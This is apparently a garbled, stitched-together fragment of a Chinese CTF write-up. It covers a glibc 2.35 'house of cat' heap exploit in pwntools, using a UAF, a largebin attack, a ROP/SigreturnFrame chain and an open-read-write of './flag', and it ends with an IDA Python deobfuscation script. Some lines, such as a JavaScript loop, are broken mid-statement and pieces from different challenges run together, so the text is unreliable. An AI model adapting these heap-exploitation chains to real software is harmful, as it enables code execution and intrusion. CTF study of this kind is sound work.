    a227(0);
    a228(0);
    a229(0);
    a230(0);
    a231(0);
    a232(0xad);
    a233(0xfd);
    a234(0x6e);
    a235(0);
    a236(0);
    a237(0);
    a238(0);
    a239(0);
    a240(0x30);
    a241(0);
    a242(0);
    a243(0);
    a244(0);
    a245(0);
    a246(0);
    a247(0);
    a248(0);
    a249(0);
    a250(0);
    a251(0);
    a252(0);
    a253(0);
    a254(0);
    a255(0);
    a232(0xad);
    a233(0xfd);
    a234(0x6e);
    a235(0);
    a236(0);
    a237(0);
    a238(0);
    a239(0);
    a187(0xff);
    a240(0x30);
    fight(0);
}
easychain1
jerry的js逃逸题
house of cat
2.35 Largebin Attack ?
ubuntu 22.04
第⼀步：LOGIN |NAME r00t QWBQWXF admin
第⼆步：CAT |NAME r00t QWBQWXF \xFF$
有个UAF
需要触发⼀个IO或者exit来劫持控制流
var tmpArray=new Array(0x100-0x7);var i=0;for(i=0;ixsputn
payload = str(payload)[0x10:]
payload += p64(heapbase+0x2460+0x100)+p64(
    enc(gadget,key)
    )
payload = payload.ljust(0x100,'\x00')
payload += 'A'*8+p64(heapbase+0x2460+0x100)+'A'*0x10+p64(libc.sym['setcontext']+61)
pop_rdi = 0x000000000002a3e5+libc.address
pop_rsi = 0x000000000002be51+libc.address
pop_rdx_rbx = 0x0000000000090529 + libc.address
pop_rax = 0x0000000000045eb0+libc.address
syscall = 0x0000000000091396+libc.address
sig = SigreturnFrame()
sig.rsp = heapbase+0x2460+0x300
sig.rip = pop_rdi+1
payload += str(sig)[0x28:]
payload = payload.ljust(0x300,'\x00')
payload += p64(pop_rdi)+p64(0)+p64(libc.sym['close'])
payload += 
p64(pop_rdi)+p64(heapbase+0x2460+0x400)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(sys
call)
payload += 
p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(heapbase+0x500)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)
+p64(libc.sym['read'])
payload += 
p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heapbase+0x500)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)
+p64(libc.sym['write'])
payload = payload.ljust(0x400)+'./flag\x00'
add(8,0x440,payload)#stderr chunk
add(9,0x430,'A')
free(5)
free(6)
add(10,0x430+0x30,'A'*0x430+p64(0)+p64(0x461))
add(11,0x420,'A') #target
free(6)
add(12,0x450,'A'*0x20+p64(0)+p64(0x19c1))
free(6)
add(13,0x460,'A')
free(8)
Reverse
find_basic
混淆提取
free(11)
payload = 
p64(libc.address+0x21a0e0)*2+p64(0)+p64(libc.sym['stderr']-0x20)+p64(0)+p64(0x301)
edit(6,payload)
# gdb.attach(s,'b _IO_cookie_read')
# add(14,0x46f,'1')
cmd(1)
s.sendlineafter("plz input your cat idx:",str(14))
s.sendlineafter("plz input your cat size:",str(0x46f))
# free(0)
s.interactive()
import re
import idautils
import ida_funcs
from pwn import *
elf = ELF("./obf_xx_find")
def disasm_filter(addr):
    s = GetDisasm(addr)
    if ';' in s:
        s = s[0: s.find(";")]
    return s.strip()
def is_bound_block(addr):
    keylist = ["pushf", "pusha", "call", "call", "popa", "popf", "push", "pushf", 
"call", "add", "popf", "jmp"]
    first_insn = disasm_filter(addr)
    if 'jmp' in first_insn:
        addr = int(get_jmp_target(first_insn, ), 16)
    for key in keylist:
        insn = disasm_filter(addr)
        addr = idc.next_head(addr)
        if key not in insn:
            return False
    return True
def is_obf_branch(addr):
    keylist = ["pushf", "pusha", "fuck_sub1", "popa", "popf"]
    for key in keylist:
        insn = disasm_filter(addr)
        addr = idc.next_head(addr)
        if key not in insn:
            return None
    return get_jmp_target(disasm_filter(addr))
def is_start_block(start_ea, end_ea):
    ea = start_ea
    while ea < end_ea:
        asm_text = disasm_filter(ea)
        if 'cmp' in asm_text and 'l' in asm_text:
            return True
        ea = idc.next_head(ea)
    return False
def get_jmp_target(j, ea = 0):
    if '$+' in j:
        return hex(int(j.split('$+')[1], 10) + ea)[2:]
    if 'sub_' in j:
        return j.split('sub_')[1]
    elif 'loc_' in j:
        return j.split('loc_')[1]
    elif 'unk_' in j:
        return j.split('unk_')[1]
    else:
        print("invalid jmp instruction: %s" % j)
        return None
def is_subhanlder_start(addr):
    keylist = ["cmp", "jnz", "popa", "popf"]
    asm_text = disasm_filter(addr)
    if ';' in asm_text:
        asm_text = asm_text[0: asm_text.find(";")]
    code = ''
    if not ('cmp' in asm_text and 'l' in asm_text):
        return None
    code = asm_text
    for key in keylist:
        insn = disasm_filter(addr)
        addr = idc.next_head(addr)
        if key not in insn:
            return None
    if 'h' in code:
        code = int(code.split(', ')[1].strip()[0: -1], 16)
    else:
        code = int(code.split(', ')[1].strip(), 16)
    return code
def parser_handler(ea):
    real_insns = []
    while True:
        asm_text = disasm_filter(ea)
        if ';' in asm_text:
            asm_text = asm_text[0: asm_text.find(";")]
        if asm_text[0] == 'j':
            target = get_jmp_target(asm_text, ea)
            if target != None:
                if is_bound_block(int(target, 16)):
                    return real_insns
                if is_obf_branch(int(target, 16)):